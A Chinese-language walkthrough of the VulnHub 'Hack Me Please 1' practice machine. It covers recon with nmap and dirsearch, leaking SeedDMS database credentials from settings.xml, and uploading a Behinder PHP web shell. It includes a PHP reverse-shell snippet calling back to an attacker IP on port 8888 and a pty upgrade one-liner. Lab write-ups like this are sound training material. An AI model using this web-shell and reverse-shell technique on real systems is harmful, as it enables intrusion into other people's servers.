VulnHub-hack-me-please-1 靶场渗透
2021-08-16 01:05:33

靶场信息

地址：vulnhub.com/entry/hack-me-please-1,731/

发布日期：2021 年 7 月 31 日

难度：容易

目标：获取root shell

描述：一个完全为 OSCP 制作的简单靶场。不需要暴力破解。

运行：VirtualBox 6.1（仅主机模式网卡172.16.10.1）

前言

本次靶场使用VirtualBox 6.1进行构建。将我的kali系统和桥接在VirtualBox的仅主机网卡。本次演练使用kali系统按照渗透的过程进行操作。

靶机网络配置参考https://www.freebuf.com/articles/web/284722.html

一、信息收集

1）确定目标

由于kali网络桥接在virtualBox的仅主机网卡，所以可以直接使用netdiscover扫描172.16.10.0网段存活主机。攻击机kali ip：172.16.10.102

netdiscover -r 172.16.10.0/24 -i eth0

得到ip地址：172.16.10.108

2）端口扫描

nmap -v -T4 -p- -A -oN nmap.log 172.16.10.108

题目描述说不需要暴力，靶机又没有打开 SSH 端口。因此，我们必须想办法在目标上进行远程命令执行。我们需要把攻击方向放在web服务。

3）访问靶机

http://172.16.10.108

网站中并没有发现有用信息。

4）使用dirsearch扫描目录列表

dirsearch -u "http://172.16.10.108/"

没有得到有用信息，使用gobuster也没有获取到有用信息

5）查看网站js文件

在/js/main.js中找到了seeddms文档管理系统链接。没有找到此版本存在的漏洞。

make sure this js file is same as installed app on our server endpoint: /seeddms51x/seeddms-5.1.22/

项目地址

https://sourceforge.net/p/seeddms/code/ci/5.1.22/tree/

6）分析项目目录结构

在conf目录中存在网站配置信息

尝试访问conf文件出错，说明路径不对

http://172.16.10.108/seeddms51x/seeddms-5.1.22/conf/

访问上级目录，响应码403说明目录存在，且存在.htaccess限制目录浏览的文件

http://172.16.10.108/seeddms51x/conf/

查看.htaccess文件

7）获取mysql用户名密码

尝试访问settings.xml

http://172.16.10.108/seeddms51x/conf/settings.xml
​
得到数据库用户名密码
seeddms/seeddms

在seeddms库的tblUsers表中找到admin用户名密码，密码使用123456的md5值进行更新

在users表中找到一个用户名密码

saket/Saket@#$1337

8）登录管理后台

通过查看项目结构得到登录页面

http://172.16.10.108/seeddms51x/seeddms-5.1.22/out/out.Login.php
​
admin/123456

二、漏洞利用

经过测试，在新建文档处存在文件上传漏洞

1）上传冰蝎马

在添加文档功能处输入名称（任意）和文件（冰蝎php shell），点击添加文档即可保存

保存成功不显示东西

返回首页查看文件夹可以看到新添加的文档

注意序号7

通过参考SeedDMS versions < 5.1.11的RCE漏洞文档https://www.exploit-db.com/exploits/47022

得到上传后的shell位置是

example.com/data/1048576/"document_id"/1.php

只需要把"document_id"位置修改为我们的7即可

使用冰蝎连接

2）反弹shell

反弹shell到kali

3）升级交互式shell

这里发现这个shell无法升级，而且很多命令无回显，使用php反弹shell的脚本重新反弹一个

ch4nge.php部分代码如下，完整的会放在网盘，链接在文末

set_time_limit (0);
$VERSION = "1.0";
$ip = '172.16.10.102';
$port = 8888;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

使用冰蝎传到靶机，本地监听8888，浏览器访问得到shell

升级交互式shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

sudo -l需要输入密码，查看存在的用户

cat /etc/passwd或者ls /home得到靶机用户saket

4）登录saket

在前面users的表中存在用户saket/Saket@#$1337

切换用户成功

三、提权到root

sudo su可以直接提权到root

总结

在此次演练中需要进行细致的信息搜集及整理利用。
